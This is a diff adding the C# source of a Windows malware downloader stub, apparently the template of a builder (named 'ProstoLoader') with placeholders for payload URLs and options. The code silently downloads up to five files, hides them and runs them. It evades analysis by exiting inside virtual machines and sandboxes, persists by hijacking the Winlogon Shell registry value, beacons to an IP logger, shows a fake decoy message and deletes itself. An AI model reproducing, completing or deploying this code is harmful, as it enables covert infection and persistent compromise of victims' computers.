@@ -1,0 +1,336 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Net.Security;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+using Microsoft.Win32;
+using System.Threading;
+using System.Collections.Generic;
+using System.Management;
+using System.Security.Cryptography.X509Certificates;
+using System.Security.Principal;
+using System.Text;
+using System.Text.RegularExpressions;
+
+[assembly: AssemblyTitle("[Title]")]
+[assembly: AssemblyDescription("[Description]")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("[Company]")]
+[assembly: AssemblyProduct("[Product]")]
+[assembly: AssemblyCopyright("[Copyright]")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+[assembly: ComVisible(false)]
+[assembly: Guid("[Guid]")]
+[assembly: AssemblyVersion("3.0.0.0")]
+[assembly: AssemblyFileVersion("[Version]")]
+
+
+namespace App
+{
+    public class Program
+    {
+
+        static string curent = Process.GetCurrentProcess().MainModule.FileName.Split('\\')[Process.GetCurrentProcess().MainModule.FileName.Split('\\').Length - 1];
+        static string Full = Environment.GetEnvironmentVariable("USERPROFILE") + "\\" + curent;
+        static string Full2 = Environment.GetEnvironmentVariable("USERPROFILE") + "\\" + "UpdateCenter.exe";
+
+
+#if VM
+        static bool AntiVM = [antivm];
+#endif
+
+
+#if STARTUP
+        static bool staartuu = [StartUp];
+#endif
+
+#if DEL
+        static bool D = [Delete];
+#endif
+
+#if FAKE
+        static String FakeM = "[Fake]";
+        static String zagolovok = @"[Zagol]";
+        static String textfake = @"[TextFake]";
+#endif
+
+
+        static void Main(string[] args)
+        {
+#if LOGGER
+            String IP = "[IP]";
+#endif
+            String U1 = "[U1]";
+            String F1 = "[F1]";
+            String U2 = "[U2]";
+            String F2 = "[F2]";
+            String U3 = "[U3]";
+            String F3 = "[F3]";
+            String U4 = "[U4]";
+            String F4 = "[F4]";
+            String U5 = "[U5]";
+            String F5 = "[F5]";
+
+            if (!InstanceCheck())
+            {
+                Process.GetCurrentProcess().Kill();
+            }
+            else
+            {
+#if VM
+                if (AntiVM)
+                {
+                    if (DetectVM())
+                        Environment.Exit(-1);
+                }
+#endif
+#if LOGGER
+                if (Application.ExecutablePath != Full2)
+                {
+                    if (IP != null)
+                    {
+                        Logger(IP, "ProstoLoader");
+                    }
+                }
+#endif
+                try
+                {
+#if D1
+                    Thread.Sleep([D1]);
+#endif
+                    DownFileEx(U1, [Path], F1);
+                }
+                catch { }
+
+                if (F2 != "")
+                {
+                    try
+                    {
+#if D2
+                    Thread.Sleep([D2]);
+#endif
+                        DownFileEx(U2,[Path], F2);
+                    }
+                    catch { }
+                }
+
+                if (F3 != "")
+                {
+                    try
+                    {
+#if D3
+                    Thread.Sleep([D3]);
+#endif
+                        DownFileEx(U3, [Path], F3);
+                    }
+                    catch { }
+                }
+
+                if (F4 != "")
+                {
+                    try
+                    {
+#if D4
+                    Thread.Sleep([D4]);
+#endif
+                        DownFileEx(U4, [Path], F4);
+                    }
+                    catch { }
+                }
+
+                if (F5 != "")
+                {
+                    try
+                    {
+#if D5
+                    Thread.Sleep([D5]);
+#endif
+                        DownFileEx(U5, [Path], F5);
+                    }
+                    catch { }
+                }
+#if FAKE
+                if (Application.ExecutablePath != Full2)//автозагрузка
+                {
+
+                    switch (FakeM)
+                    {
+                        case "None":
+
+                            break;
+                        case "Information":
+                            MessageBox.Show(textfake, zagolovok, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
+                            break;
+                        case "Question":
+                            MessageBox.Show(textfake, zagolovok, MessageBoxButtons.OK, MessageBoxIcon.Question);
+                            break;
+                        case "Warning":
+                            MessageBox.Show(textfake, zagolovok, MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                            break;
+                        case "Error":
+                            MessageBox.Show(textfake, zagolovok, MessageBoxButtons.OK, MessageBoxIcon.Error);
+                            break;
+                    }
+
+            }
+#endif
+#if STARTUP
+                if (!File.Exists(Full2))//автозагрузка
+                {
+                    if (staartuu)
+                    {
+                        File.Copy(Environment.CurrentDirectory + "\\" + curent, Full);
+                        new FileInfo(Full).Attributes = FileAttributes.Hidden | FileAttributes.System;
+                        File.Move(Full, Full2);
+                        File.Delete(Full);
+                        StartUp();
+
+                    }
+                }
+#endif
+#if DEL
+                if (Application.ExecutablePath != Full2)//автозагрузка
+                {
+                    if (D)//Самоудаление
+                    {
+                        Del();
+                    }
+                }
+#endif
+            }
+        }
+
+        //-------------------------------------------------------------------------------------------------------------
+
+
+
+        static Mutex InstanceCheckMutex;
+        static bool InstanceCheck()
+        {
+            bool isNew;
+            InstanceCheckMutex = new Mutex(true, "UNIC_KEY", out isNew);
+            return isNew;
+        }
+
+
+
+        public static void DownFileEx(string Link, string SavePath, string FileName)
+        {
+            string path = SavePath + "\\" + FileName;
+            byte[] srv = null;
+
+            if (File.Exists(path))
+            {
+                File.Delete(path);
+            }
+            using (WebClient web = new WebClient())
+            {
+                //  web.DownloadFile(new Uri(Link), path);
+                srv = web.DownloadData(new Uri(Link));
+                File.WriteAllBytes(path, srv);
+                new FileInfo(path).Attributes = FileAttributes.Hidden | FileAttributes.System;
+                Process.Start(path);
+            }
+
+
+
+
+
+        }
+#if STARTUP
+        public static void StartUp()
+        {
+
+            RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
+            key.SetValue("Shell", "explorer.exe, " + Full2);
+            try
+            {
+                RegistryKey key2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
+                key2.SetValue("Shell", "explorer.exe, " + Full2);
+            }
+            catch { }
+
+        }
+#endif
+#if LOGGER
+        public static bool Logger(string adr, string res)
+        {
+            bool result = false;
+            try
+            {
+                string ipLogLink = adr;
+                string respon = res;
+
+                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(ipLogLink);
+
+                req.Headers.Add("Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
+                req.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0";
+
+                HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
+
+                using (StreamReader stream = new StreamReader(
+                     resp.GetResponseStream(), Encoding.UTF8))
+                {
+                    respon = stream.ReadToEnd();
+
+                    if (respon != "" || respon != String.Empty)
+                    {
+                        return result = true;
+                    }
+                }
+
+            }
+            catch (Exception)
+            {
+                return result = false;
+            }
+            return result;
+        }
+#endif
+#if DEL
+        public static void Del()
+        {
+            ProcessStartInfo Info = new ProcessStartInfo();
+            Info.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath;
+            Info.WindowStyle = ProcessWindowStyle.Hidden;
+            Info.CreateNoWindow = true;
+            Info.FileName = "cmd.exe";
+            Process.Start(Info);
+        }
+#endif
+
+#if VM
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetModuleHandle(string running);
+        static bool DetectVM()
+        {
+            using (var searcher = new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+            {
+                using (var items = searcher.Get())
+                {
+                    foreach (var item in items)
+                    {
+                        string manufacturer = item["Manufacturer"].ToString().ToLower();
+                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
+                            || manufacturer.Contains("vmware")
+                            || item["Model"].ToString() == "VirtualBox" || GetModuleHandle("cmdvrt32.dll").ToInt32() != 0 || GetModuleHandle("SxIn.dll").ToInt32() != 0
+                   || GetModuleHandle("SbieDll.dll").ToInt32() != 0 || GetModuleHandle("Sf2.dll").ToInt32() != 0 ||
+                   GetModuleHandle("snxhk.dll").ToInt32() != 0)
+                        {
+                            return true;
+                        }
+                    }
+                }
+            }
+            return false;
+        }
+#endif
+
+    }
+}
+
+
